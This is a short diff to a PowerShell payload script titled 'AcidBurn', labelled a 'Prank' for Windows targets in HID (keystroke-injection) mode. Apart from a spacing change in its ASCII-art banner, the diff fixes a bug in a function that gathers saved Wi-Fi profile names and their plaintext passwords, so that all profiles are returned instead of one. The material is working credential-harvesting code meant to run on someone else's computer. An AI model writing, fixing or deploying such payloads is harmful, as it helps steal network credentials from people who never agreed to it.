@@ -3,7 +3,7 @@
 # Title        : AcidBurn          | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
 # Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
 # Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
-# Category     : Prank           | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
+# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
 # Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
 # Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
 #                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
@@ -257,8 +257,9 @@ Foreach($WLANProfileName in $WLANProfileNames){
     $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
     $WLANProfileObjects += $WLANProfileObject
     Remove-Variable WLANProfileObject
-	return $WLANProfileObjects
+	
 }
+return $WLANProfileObjects
 }
 
 $Networks = Get-Networks
